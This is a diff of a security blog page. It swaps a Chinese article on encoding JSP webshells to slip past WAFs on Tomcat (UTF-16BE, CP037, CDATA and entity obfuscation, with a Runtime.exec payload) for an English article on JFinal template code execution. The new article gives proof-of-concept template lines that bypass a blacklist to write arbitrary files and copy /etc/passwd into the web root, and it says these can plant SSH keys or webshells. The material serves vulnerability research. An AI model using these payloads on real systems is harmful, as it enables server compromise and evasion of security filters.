@@ -6,29 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://turn1tup.github.io">
-  <title>WAF_Bypass之wesbhell上传-jsp与tomcat | turn1tup&#39;s bolg</title>
+  <title>JFinal Code Execution | turn1tup&#39;s bolg</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="1.开个头事情是这样的，某一天，笔者闲着无聊，对着Tomcat的示例文件到处点点，希望寻找出点什么，意外发现Tomcat的示例文件中一些有趣的示例：  随后笔者翻开Tomcat的解析代码，对其进行了一番静态代码审阅，果然有蹊跷，后面又调试看了看。 2 代码要点简析对于脚本jsp文件，会通过EncodingDetector进行字符集类型的探测，该处代码要点较多，也是主逻辑，所以整片代码放上来了。 a">
+  <meta name="description" content="JFinal Code ExcutionJFinal is a Java Web framework with front-end rendering function. If its front-end template allows users to edit, it will cause code execution vulnerability. JFinal itself does som">
 <meta property="og:type" content="article">
-<meta property="og:title" content="WAF_Bypass之wesbhell上传-jsp与tomcat">
-<meta property="og:url" content="https://turn1tup.github.io/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/index.html">
+<meta property="og:title" content="JFinal Code Execution">
+<meta property="og:url" content="https://turn1tup.github.io/2021/04/15/JFinal%20Code%20Execution/index.html">
 <meta property="og:site_name" content="turn1tup&#39;s bolg">
-<meta property="og:description" content="1.开个头事情是这样的，某一天，笔者闲着无聊，对着Tomcat的示例文件到处点点，希望寻找出点什么，意外发现Tomcat的示例文件中一些有趣的示例：  随后笔者翻开Tomcat的解析代码，对其进行了一番静态代码审阅，果然有蹊跷，后面又调试看了看。 2 代码要点简析对于脚本jsp文件，会通过EncodingDetector进行字符集类型的探测，该处代码要点较多，也是主逻辑，所以整片代码放上来了。 a">
+<meta property="og:description" content="JFinal Code ExcutionJFinal is a Java Web framework with front-end rendering function. If its front-end template allows users to edit, it will cause code execution vulnerability. JFinal itself does som">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://turn1tup.github.io/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/tomcat_jsp_xml_example.png">
-<meta property="og:image" content="https://turn1tup.github.io/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/determineSyntaxAndEncoding2.png">
-<meta property="og:image" content="https://turn1tup.github.io/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/EncodingDetector.png">
-<meta property="og:image" content="https://turn1tup.github.io/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/processBom.png">
-<meta property="og:image" content="https://turn1tup.github.io/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/getPrologEncoding.png">
-<meta property="og:image" content="https://turn1tup.github.io/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/flowToCharsetLoolup.png">
-<meta property="og:image" content="https://turn1tup.github.io/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/getPageEncodingForJspSyntax.png">
-<meta property="og:image" content="https://turn1tup.github.io/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/magic_charset.png">
-<meta property="og:image" content="https://turn1tup.github.io/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/charset_test_py.png">
-<meta property="article:published_time" content="2020-07-09T09:46:51.516Z">
-<meta property="article:modified_time" content="2020-07-09T09:46:51.516Z">
+<meta property="article:published_time" content="2021-04-15T13:40:59.035Z">
+<meta property="article:modified_time" content="2021-04-15T13:40:59.035Z">
 <meta property="article:author" content="turn1tup">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://turn1tup.github.io/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/tomcat_jsp_xml_example.png">
   
     <link rel="alternative" href="/atom.xml" title="turn1tup&#39;s bolg" type="application/atom+xml">
   
@@ -164,95 +154,44 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-WAF_Bypass之wesbhell上传-jsp与tomcat" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-JFinal Code Execution" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      WAF_Bypass之wesbhell上传-jsp与tomcat
+      JFinal Code Execution
     </h1>
   
 
         
-        <a href="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/" class="archive-article-date">
-  	<time datetime="2020-07-09T09:46:51.516Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-09</time>
+        <a href="/2021/04/15/JFinal%20Code%20Execution/" class="archive-article-date">
+  	<time datetime="2021-04-15T13:40:59.035Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-15</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="1-开个头"><a href="#1-开个头" class="headerlink" title="1.开个头"></a>1.开个头</h1><p>事情是这样的，某一天，笔者闲着无聊，对着Tomcat的示例文件到处点点，希望寻找出点什么，意外发现Tomcat的示例文件中一些有趣的示例：</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/tomcat_jsp_xml_example.png" alt></p>
-<p>随后笔者翻开Tomcat的解析代码，对其进行了一番静态代码审阅，果然有蹊跷，后面又调试看了看。</p>
-<h1 id="2-代码要点简析"><a href="#2-代码要点简析" class="headerlink" title="2 代码要点简析"></a>2 代码要点简析</h1><p>对于脚本jsp文件，会通过EncodingDetector进行字符集类型的探测，该处代码要点较多，也是主逻辑，所以整片代码放上来了。</p>
-<p>apache-tomcat-9.0.35/lib/jasper.jar!/org/apache/jasper/compiler/ParserController.class：determineSyntaxAndEncoding</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/determineSyntaxAndEncoding2.png" alt></p>
-<p>编码探测过程在该类初始化方法中进行，首先会使用processBom方法，根据文件的前4个字节探测字符集类型，这里的代码和xerces的Magic Charset中的字符集类型探测代码有着异曲同工之妙…；之后会使用getPrologEncoding方法尝试获取文件的declare charset，declare charset优先级高于magic charset。</p>
-<p>apache-tomcat-9.0.35/lib/jasper.jar!/org/apache/jasper/compiler/EncodingDetector.class</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/EncodingDetector.png" alt></p>
-<p>processBom方法会调用parseBom方法根据文件头4个字节返回字符集类型：</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/processBom.png" alt></p>
-<p>getPrologEncoding将文件流传入xml解析，底层还是用的xerces，如果编码类型为xerces不支持的，这里会暂时忽略掉异常。</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/getPrologEncoding.png" alt></p>
-<p>但并非processBom或getPrologEncoding得到的字符集就能被成功，后续创建字符流读取器会检查自身是否支持这些字符集。</p>
-<p>这一步中也会做字符集别名的映射查找，一番操作过后，如果该字符集未读取器不支持的，最后会抛出异常。如UTF-32BE字符集，在getPrologEncoding方法中会抛出异常（不支持），在processBom中虽然不会抛出异常，但是其过程中得到的字符集名称为ISO-10646-UCS-4。而在InputStreamReader中不支持该字符集，也无别名映射（想想也是，ISO-10646-UCS-4这个名字根本也无法判断大端小端，而且代码流程中也没有传递大小端这一变量）。</p>
-<p>jdk1.8.0_191/src.zip!/java/nio/charset/Charset.java</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/flowToCharsetLoolup.png" alt></p>
-<p>ParserController.class：determineSyntaxAndEncoding方法中，如果文件没有带BOM，会触发getPageEncodingForJspSyntax函数流程</p>
-<p>apache-tomcat-9.0.30-src/java/org/apache/jasper/compiler/ParserController.java，getPageEncodingForJspSyntax</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/getPageEncodingForJspSyntax.png" alt></p>
-<p>从代码来看，指令标签有好几种：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:directive.page  &#x2F;&gt;</span><br></pre></td></tr></table></figure>
+        <h1 id="JFinal-Code-Excution"><a href="#JFinal-Code-Excution" class="headerlink" title="JFinal Code Excution"></a>JFinal Code Excution</h1><p>JFinal is a Java Web framework with front-end rendering function. If its front-end template allows users to edit, it will cause code execution vulnerability. JFinal itself does some blacklist restrictions, but there are bypass problems.</p>
+<p>JFinal only allows users to invoke static methods, and in com.jfinal.template.expr.ast.MethodKit we can see JFinal do some blacklist to restrict code execution. After debugging, we found a total of 16 classes that were masked.</p>
+<p>![block_class](JFinal Code Execution\block_class.png)</p>
+<p>But most Web applications contain a number of third-party libraries that are available in static methods.</p>
+<p>I have push an example on gihub  ( <a href="https://github.com/turn1tup/JFinalTest" target="_blank" rel="noopener">https://github.com/turn1tup/JFinalTest</a>), you can use this code example to understand  this vul.</p>
+<p>This is the Class  used to render a html page and which triggering holes.</p>
+<p>![block_class](JFinal Code Execution\TestMain.png)</p>
+<p>We circumvented JFinal’s blacklist policy by using third-party libraries</p>
+<p>The POC can upload any file to any location of the server, we can write the SSH public key, timing task or webshell to  getshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#set(uri&#x3D;java.net.URI::create(&quot;https:&#x2F;&#x2F;github.com&#x2F;turn1tup&#x2F;JFinalTest&#x2F;blob&#x2F;main&#x2F;README.md&quot;))</span><br><span class="line">#set(url&#x3D;uri.toURL())</span><br><span class="line">#set(paths&#x3D;java.nio.file.Paths::get(&quot;D:&#x2F;&quot;, &quot;success.txt&quot;))</span><br><span class="line">#(org.apache.commons.io.file.PathUtils::copyFile(url, paths))</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page  %&gt;</span><br></pre></td></tr></table></figure>
+<p>This POC can copy any file to any location of the server, and then we can access the file from http</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#set(srcFile&#x3D;java.nio.file.Paths::get(&quot;&#x2F;etc&#x2F;passwd&quot;))</span><br><span class="line">#set(dstPath&#x3D;java.nio.file.Paths::get(&quot;&#x2F;root&#x2F;starter&#x2F;webapp&#x2F;&quot;))</span><br><span class="line">#(org.apache.commons.io.file.PathUtils::copyFileToDirectory(srcFile, dstPath))</span><br></pre></td></tr></table></figure>
 
-<p>声明字符编码的方式至少有两种：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pageEncoding&#x3D;&quot;UTF-16be&quot;</span><br></pre></td></tr></table></figure>
+<p>Use this POC the get the webapp dir.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#set(fileSys&#x3D;java.nio.file.FileSystems::getDefault())</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contentType&#x3D;&quot;charset&#x3D;utf-16be&quot;</span><br></pre></td></tr></table></figure>
-
-<h1 id="2-实战讲解"><a href="#2-实战讲解" class="headerlink" title="2 实战讲解"></a>2 实战讲解</h1><h2 id="2-1-charset"><a href="#2-1-charset" class="headerlink" title="2.1 charset"></a>2.1 charset</h2><p>通过阅读代码流程，我们可以得到如下表格，该表格用于Magic Charset方法，而XML的Declare Charset也可以使用，笔者在这里就不再描述了，参考笔者的关于xerces解析的文章即可 <a href="https://www.anquanke.com/post/id/209826" target="_blank" rel="noopener">WAF Bypass之xerces解析</a>。</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/magic_charset.png" alt></p>
-<p>有如下原始JSP文件，jsp_xml.jsp:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;jsp:root xmlns:jsp&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;JSP&#x2F;Page&quot;</span><br><span class="line">  version&#x3D;&quot;1.2&quot;&gt;</span><br><span class="line">&lt;jsp:directive.page contentType&#x3D;&quot;text&#x2F;html&quot;&#x2F;&gt;</span><br><span class="line">&lt;jsp:declaration&gt;</span><br><span class="line">&lt;&#x2F;jsp:declaration&gt;</span><br><span class="line">&lt;jsp:scriptlet&gt;</span><br><span class="line">out.write(&quot;I&#39;m turn1tup!&quot;);</span><br><span class="line">&lt;&#x2F;jsp:scriptlet&gt;</span><br><span class="line">&lt;jsp:text&gt;</span><br><span class="line">&lt;&#x2F;jsp:text&gt;</span><br><span class="line">&lt;&#x2F;jsp:root&gt;</span><br></pre></td></tr></table></figure>
-
-<p>使用UTF-16BE字符集进行编码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%00%3C%00%3F%00x%00m%00l%00%20%00v%00e%00r%00s%00i%00o%00n%00%3D%00%22%001%00.%000%00%22%00%20%00e%00n%00c%00o%00d%00i%00n%00g%00%3D%00%22%00U%00T%00F%00-%001%006%00b%00e%00%22%00%3F%00%3E%00%0A%00%3C%00j%00s%00p%00%3A%00r%00o%00o%00t%00%20%00x%00m%00l%00n%00s%00%3A%00j%00s%00p%00%3D%00%22%00h%00t%00t%00p%00%3A%00&#x2F;%00&#x2F;%00j%00a%00v%00a%00.%00s%00u%00n%00.%00c%00o%00m%00&#x2F;%00J%00S%00P%00&#x2F;%00P%00a%00g%00e%00%22%00%0A%00%20%00%20%00v%00e%00r%00s%00i%00o%00n%00%3D%00%22%001%00.%002%00%22%00%3E%00%0A%00%3C%00j%00s%00p%00%3A%00d%00i%00r%00e%00c%00t%00i%00v%00e%00.%00p%00a%00g%00e%00%20%00c%00o%00n%00t%00e%00n%00t%00T%00y%00p%00e%00%3D%00%22%00t%00e%00x%00t%00&#x2F;%00h%00t%00m%00l%00%22%00&#x2F;%00%3E%00%0A%00%3C%00j%00s%00p%00%3A%00d%00e%00c%00l%00a%00r%00a%00t%00i%00o%00n%00%3E%00%0A%00%3C%00&#x2F;%00j%00s%00p%00%3A%00d%00e%00c%00l%00a%00r%00a%00t%00i%00o%00n%00%3E%00%0A%00%3C%00j%00s%00p%00%3A%00s%00c%00r%00i%00p%00t%00l%00e%00t%00%3E%00%0A%00o%00u%00t%00.%00w%00r%00i%00t%00e%00%28%00%22%00I%00%27%00m%00%20%00t%00u%00r%00n%001%00t%00u%00p%00%21%00%22%00%29%00%3B%00%0A%00%3C%00&#x2F;%00j%00s%00p%00%3A%00s%00c%00r%00i%00p%00t%00l%00e%00t%00%3E%00%0A%00%3C%00j%00s%00p%00%3A%00t%00e%00x%00t%00%3E%00%0A%00%3C%00&#x2F;%00j%00s%00p%00%3A%00t%00e%00x%00t%00%3E%00%0A%00%3C%00&#x2F;%00j%00s%00p%00%3A%00r%00o%00o%00t%00%3E%00%0A</span><br></pre></td></tr></table></figure>
-
-<p>使用CP037进行编码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lo%A7%94%93%40%A5%85%99%A2%89%96%95%7E%7F%F1K%F0%7F%40%85%95%83%96%84%89%95%87%7E%7F%83%97%F0%F3%F7%7Fon%25L%91%A2%97z%99%96%96%A3%40%A7%94%93%95%A2z%91%A2%97%7E%7F%88%A3%A3%97zaa%91%81%A5%81K%A2%A4%95K%83%96%94a%D1%E2%D7a%D7%81%87%85%7F%25%40%40%A5%85%99%A2%89%96%95%7E%7F%F1K%F2%7Fn%25L%91%A2%97z%84%89%99%85%83%A3%89%A5%85K%97%81%87%85%40%83%96%95%A3%85%95%A3%E3%A8%97%85%7E%7F%A3%85%A7%A3a%88%A3%94%93%7Fan%25L%91%A2%97z%84%85%83%93%81%99%81%A3%89%96%95n%25La%91%A2%97z%84%85%83%93%81%99%81%A3%89%96%95n%25L%91%A2%97z%A2%83%99%89%97%A3%93%85%A3n%25%96%A4%A3K%A6%99%89%A3%85M%7F%C9%7D%94%40%A3%A4%99%95%F1%A3%A4%97Z%7F%5D%5E%25La%91%A2%97z%A2%83%99%89%97%A3%93%85%A3n%25L%91%A2%97z%A3%85%A7%A3n%25La%91%A2%97z%A3%85%A7%A3n%25La%91%A2%97z%99%96%96%A3n%25</span><br></pre></td></tr></table></figure>
-
-<p>编码方式可参考 <a href="https://github.com/turn1tup/scripts/blob/master/charset_test.py" target="_blank" rel="noopener">https://github.com/turn1tup/scripts/blob/master/charset_test.py</a> ：</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/charset_test_py.png" alt></p>
-<p>对于以下代码，我们也可以对其进行编码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% out.write(&quot;I&#x2F;&#39;m turn1tup!&quot;);  %&gt;</span><br></pre></td></tr></table></figure>
-
-<p>使用UTF-16BE编码，需带BOM标识：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%FE%FF%00%3C%00%25%00%20%00o%00u%00t%00.%00w%00r%00i%00t%00e%00%28%00%22%00I%00%27%00m%00%20%00t%00u%00r%00n%001%00t%00u%00p%00%21%00%22%00%29%00%3B%00%20%00%25%00%3E</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-2-XML特性"><a href="#2-2-XML特性" class="headerlink" title="2.2 XML特性"></a>2.2 XML特性</h2><p>参考文章 <a href="https://www.anquanke.com/post/id/209826" target="_blank" rel="noopener">WAF Bypass之xerces解析</a>，这里举一些例子：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;jsp:root xmlns:jsp=<span class="string">"http://java.sun.com/JSP/Page"</span></span><br><span class="line">  version=<span class="string">"1.2"</span>&gt;</span><br><span class="line">&lt;jsp:directive.page contentType=<span class="string">"text/html"</span>/&gt;</span><br><span class="line">&lt;jsp:declaration&gt;</span><br><span class="line">&lt;/jsp:declaration&gt;</span><br><span class="line">&lt;jsp:scriptlet&gt;</span><br><span class="line">&lt;![CDATA[o]]&gt;u&lt;![CDATA[t.writ]]&gt;&lt;![CDATA[e]]&gt;(<span class="string">"I'm turn1tup!"</span>);</span><br><span class="line">&lt;/jsp:scriptlet&gt;</span><br><span class="line">&lt;jsp:text&gt;</span><br><span class="line">&lt;/jsp:text&gt;</span><br><span class="line">&lt;/jsp:root&gt;</span><br></pre></td></tr></table></figure>
-
-<p>HTML实体编码，包括16进制、10进制、字符实体：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;jsp:root xmlns:jsp=<span class="string">"http://java.sun.com/JSP/Page"</span></span><br><span class="line">  version=<span class="string">"1.2"</span>&gt;</span><br><span class="line">&lt;jsp:directive.page contentType=<span class="string">"text/html"</span>/&gt;</span><br><span class="line">&lt;jsp:declaration&gt;</span><br><span class="line">&lt;/jsp:declaration&gt;</span><br><span class="line">&lt;jsp:scriptlet&gt;</span><br><span class="line">&amp;#111;&amp;#117;&amp;#116;&amp;#46;&amp;#119;&amp;#114;&amp;#105;&amp;#116;&amp;#101;&amp;#40;&amp;#34;&amp;#73;&amp;#39;&amp;#109;&amp;#32;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#49;&amp;#116;&amp;#117;&amp;#112;&amp;#33;&amp;#34;&amp;#41;&amp;#59;</span><br><span class="line">&lt;/jsp:scriptlet&gt;</span><br><span class="line">&lt;jsp:text&gt;</span><br><span class="line">&lt;/jsp:text&gt;</span><br><span class="line">&lt;/jsp:root&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-3-PageEncoding"><a href="#2-3-PageEncoding" class="headerlink" title="2.3 PageEncoding"></a>2.3 PageEncoding</h2><p>指令标签&lt;%@方式：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType&#x3D;&quot;charset&#x3D;utf-16be&quot; %&gt;%00%3C%00%25%00%20%00o%00u%00t%00.%00w%00r%00i%00t%00e%00%28%00%22%00I%00%27%00m%00%20%00t%00u%00r%00n%001%00t%00u%00p%00%21%00%22%00%29%00%3B%00%20%00o%00u%00t%00.%00p%00r%00i%00n%00t%00%28%00R%00u%00n%00t%00i%00m%00e%00.%00g%00e%00t%00R%00u%00n%00t%00i%00m%00e%00%28%00%29%00.%00e%00x%00e%00c%00%28%00%22%00c%00a%00l%00c%00%22%00%29%00%29%00%3B%00%20%00%25%00%3E</span><br></pre></td></tr></table></figure>
-
-<p>指令标签&lt;jsp:directive.page  /&gt; 方式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:directive.page contentType&#x3D;&quot;charset&#x3D;utf-16be&quot;&#x2F;&gt;%00%3C%00%25%00%20%00o%00u%00t%00.%00w%00r%00i%00t%00e%00%28%00%22%00I%00%27%00m%00%20%00t%00u%00r%00n%001%00t%00u%00p%00%21%00%22%00%29%00%3B%00%20%00o%00u%00t%00.%00p%00r%00i%00n%00t%00%28%00R%00u%00n%00t%00i%00m%00e%00.%00g%00e%00t%00R%00u%00n%00t%00i%00m%00e%00%28%00%29%00.%00e%00x%00e%00c%00%28%00%22%00c%00a%00l%00c%00%22%00%29%00%29%00%3B%00%20%00%25%00%3E</span><br></pre></td></tr></table></figure>
-
-<p>PageEncoding声明方式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:directive.page pageEncoding&#x3D;&quot;utf-16be&quot;&#x2F;&gt;%00%3C%00%25%00%20%00o%00u%00t%00.%00w%00r%00i%00t%00e%00%28%00%22%00I%00%27%00m%00%20%00t%00u%00r%00n%001%00t%00u%00p%00%21%00%22%00%29%00%3B%00%20%00o%00u%00t%00.%00p%00r%00i%00n%00t%00%28%00R%00u%00n%00t%00i%00m%00e%00.%00g%00e%00t%00R%00u%00n%00t%00i%00m%00e%00%28%00%29%00.%00e%00x%00e%00c%00%28%00%22%00c%00a%00l%00c%00%22%00%29%00%29%00%3B%00%20%00%25%00%3E</span><br></pre></td></tr></table></figure>
-
-
-<p>标签的位置也可以变化：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%00%3C%00%25%00%20%00o%00u%00t%00.%00w%00r%00i%00t%00e%00%28%00%22%00I%00%27%00m%00%20%00t%00u%00r%00n%001%00t%00u%00p%00%21%00%22%00%29%00%3B%00%20%00o%00u%00t%00.%00p%00r%00i%00n%00t%00%28%00R%00u%00n%00t%00i%00m%00e%00.%00g%00e%00t%00R%00u%00n%00t%00i%00m%00e%00%28%00%29%00.%00e%00x%00e%00c%00%28%00%22%00c%00a%00l%00c%00%22%00%29%00%29%00%3B%00%20%00%25%00%3E&lt;%@ page contentType&#x3D;&quot;charset&#x3D;utf-16be&quot;</span><br></pre></td></tr></table></figure>
-
-<h1 id="3-结语"><a href="#3-结语" class="headerlink" title="3 结语"></a>3 结语</h1><p>好吧，还是有点意思。</p>
+<p>For example, JPress (<a href="https://github.com/JPressProjects/jpress" target="_blank" rel="noopener">https://github.com/JPressProjects/jpress</a>) is the  Web application that uses JFinal and has this code execution problem.</p>
 
       
 
@@ -337,7 +276,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://turn1tup.github.io/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://turn1tup.github.io/2021/04/15/JFinal%20Code%20Execution/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -351,18 +290,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          OpenRASP学习笔记
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">WAF_Bypass之XML解析-上</div>
+    <a href="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">OpenRASP学习笔记</div>
       <i class="icon-circle-right"></i>
     </a>
   
